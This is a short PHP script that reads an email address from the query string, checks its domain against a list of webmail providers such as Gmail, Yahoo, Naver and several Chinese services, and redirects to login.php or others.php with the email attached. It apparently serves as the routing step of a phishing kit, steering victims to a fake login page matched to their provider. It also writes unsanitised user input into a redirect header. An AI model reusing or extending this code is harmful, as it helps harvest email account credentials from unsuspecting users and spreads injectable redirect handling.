<?php
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
} 
// Example
$email = $_GET['email'];
$domain = getDomainFromEmail($email);

$domain_check = '@'.strtolower($domain);

if(stripos($domain_check, '@gmail.') !== false || stripos($domain_check, '@yahoo.') !== false || stripos($domain_check, '@daum.') !== false || stripos($domain_check, '@naver.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@21cn.') !== false  || stripos($domain_check, '@126.') !== false || stripos($domain_check, '@mailQQ.') !== false || stripos($domain_check, '@163.') !== false || stripos($domain_check, '@139.') !== false || stripos($domain_check, '@mailtom.') !== false || stripos($domain_check, '@188.') !== false || stripos($domain_check, '@189.') !== false || stripos($domain_check, '@mxhi.') !== false || stripos($domain_check, '@263.') !== false || stripos($domain_check, '@ali.') !== false || stripos($domain_check, '@sina.') !== false || stripos($domain_check, '@aliyun.') !== false || stripos($domain_check, '@jbichem.') !== false || stripos($domain_check, '@vip126.') !== false || stripos($domain_check, '@yeah.') !== false || stripos($domain_check, '@mailchina.') !== false || stripos($domain_check, '@vipsina.') !== false || stripos($domain_check, '@mail.126.') !== false || stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@mail.163.') !== false   ) 

{
    
		header("Location: login.php?domain=http://$domain&email=$email");

}
else {
		header("Location: others.php?domain=http://$domain&email=$email");
	}
?>

